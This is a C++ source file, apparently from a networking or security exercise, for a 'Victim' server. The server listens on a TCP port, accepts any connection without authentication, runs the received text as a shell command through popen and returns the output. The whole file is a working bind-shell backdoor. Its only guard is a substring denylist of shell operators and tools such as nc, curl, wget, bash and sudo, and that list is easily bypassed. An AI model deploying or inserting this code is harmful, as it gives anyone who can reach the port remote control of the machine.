#include <iostream>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <csignal>
#include <fstream>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sstream>
#define DEFAULTFDVALUE -1
#define NUMBOFARGS 2
#define BUFFERSIZE 1024
#define EOFINDICATOR "EOF\n"

using namespace std;

class Victim{
public:
    // class members
    int socketFD;
    const int port;

    // Constructor
    Victim(const int port) : socketFD(DEFAULTFDVALUE),port(port){}
    // Destructor
    ~Victim(){ close_socket(socketFD);}

    // function prototypes
    int create_socket();
    void bind_socket(int socketFD);
    void listen_on_socket(int socketFD,int maxConnections);
    int accept_connection(int socketFD);
    string handle_request(int attackerFD);
    string execute_command(string command);
    void send_response(int attackerFD,string output);
    void close_socket(int socketFD);
};

// flag to decide when program is done
volatile sig_atomic_t exit_flag = 0;

// Signal handler function
void sigint_handler(int signum) {
    exit_flag = 1;
}

// Function that sets up signal handler
// This function is purely based off of the example code from
// https://github.com/programming101dev/c-examples/blob/main/domain-socket/read-write/server.c
void setup_signal_handler() {
    struct sigaction sa;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;

    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    // Install the SIGINT handler
    // if this fails, exit program right here
    if (sigaction(SIGINT, &sa, NULL) == -1) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char*argv[]) {

    // Setup signal handler
    setup_signal_handler();

    // validate command line arguments
    if(argc != NUMBOFARGS){
        cerr << "Incorrect amount of command line arguments, only provide port number!" << endl;
        return EXIT_FAILURE;
    }
    int port = stoi(argv[1]);

    cout << "Victim has started" << endl;

    Victim *victim = new Victim(port);
    int socketFD = victim ->create_socket();
    victim ->bind_socket(socketFD);
    victim ->listen_on_socket(socketFD, SOMAXCONN);

    // Continuously accept attackers until signal doesn't go off
    while (!exit_flag) {
        int attackerFD = victim ->accept_connection(socketFD);

        if (attackerFD == -1) {
            // ensure the signal isn't flagged
            if (exit_flag) {
                break;
            }
            // If there was an error accepting a attacker then try again
            continue;
        }

        string command = victim ->handle_request(attackerFD);

        string output = victim ->execute_command(command);

        // attacker socket will shut itself down after receiving a response
        victim ->send_response(attackerFD, output);
        
    }

    // if exit flag reached
    delete(victim);

    return 0;
}

int Victim::create_socket() {

    // initialize the socket as over the network
    socketFD = socket(AF_INET,SOCK_STREAM,0);
    // check for error
    if(socketFD == -1){
        cerr << "Error in creating socket: " << strerror(errno) <<endl;
        exit(EXIT_FAILURE);
    }
    cout << "Socket created succesfully" << endl;
    return socketFD;
}

void Victim::bind_socket(int socketFD) {

    // initialize sockaddr_in structure
    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port); 

    // attempt binding and check for error
    if(::bind(socketFD,(struct sockaddr*)&addr,sizeof(addr))==-1){
        cerr << "Error in binding socket: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }

    cout << "Socket successfully bound at port " << port << endl;
}

void Victim::listen_on_socket(int socketFD, int maxConnections) {
    if(listen(socketFD,maxConnections) == -1){
        cerr << "Error in listening on socket: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }
    cout << "Listening on socket for connections" << endl;
}

int Victim::accept_connection(int socketFD) {

    // store client info
    struct sockaddr_in client_addr;
    socklen_t client_addr_size = sizeof(client_addr);

    int attackerFD = accept(socketFD,(struct sockaddr*)&client_addr,&client_addr_size);
    if(attackerFD  == -1){
        cerr << "Error connecting to a new attacker: " << strerror(errno) << endl;
        return -1;
    }

    cout << "New attacker has been connected!" << endl;
    return attackerFD ;
}

string Victim::handle_request(int clientFD) {
    string command;
    char buffer[BUFFERSIZE];
    ssize_t requestData;

    while ((requestData = read(clientFD, buffer, BUFFERSIZE - 1)) > 0) {
        buffer[requestData] = '\0';
        command += buffer;

        // Check for EOF indicator
        size_t eofPos = command.find(EOFINDICATOR);
        if (eofPos != string::npos) {
            // Remove the EOF indicator from the command
            command.erase(eofPos, strlen(EOFINDICATOR));
            break;
        }
    }

    if (requestData == -1) {
        cerr << "Error reading from attacker: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }

    return command;
}


string Victim::execute_command(string command) {
    string output;
    char buffer[BUFFERSIZE];

    // list of commands we are not allowing 
    vector<string> disAllowed = {
    "<", ">", ">>", "|", ";", "&&", "||", "`", "$(", "rm", "rmdir", "mv", "cp", "dd","chmod", "chown", "exec", "eval",
    "shutdown", "reboot", "halt", "poweroff","kill", "killall", "pkill","bash", "sh","sudo","nc", "ncat", "telnet", 
    "ftp", "scp", "sftp", "curl", "wget","ps", "top", "htop", "netstat", "ss", "lsof","whoami", "id"
    };

    // Check if command contains any blocked patterns
    for (const string& pattern : disAllowed) {
        if (command.find(pattern) != string::npos) {
            return "Error: This command is not allowed!\n";
        }
    }

    cout << "Executing command: " << command << endl;

    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to execute command." << endl;
        return "Error: Command execution failed.\n";
    }

    // Read the command's output
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }

    // Close the pipe and check exit status
    int returnCode = pclose(pipe);
    if (returnCode != 0) {
        output += "\nCommand returned with error code: " + to_string(returnCode) + "\n";
    }

    return output;
}


void Victim::send_response(int attackerFD, string output) {
    output += EOFINDICATOR;
    ssize_t responseBytes = send(attackerFD, output.c_str(), output.size(), 0);

    if (responseBytes == -1) {
        cerr << "Error sending response: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }

    cout << "Response sent successfully to attacker" << endl;
}


void Victim::close_socket(int socketFD) {
    if(close(socketFD) == -1){
        cerr << "Error closing socket: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }

    cout << "Socket closed successfully" << endl;
}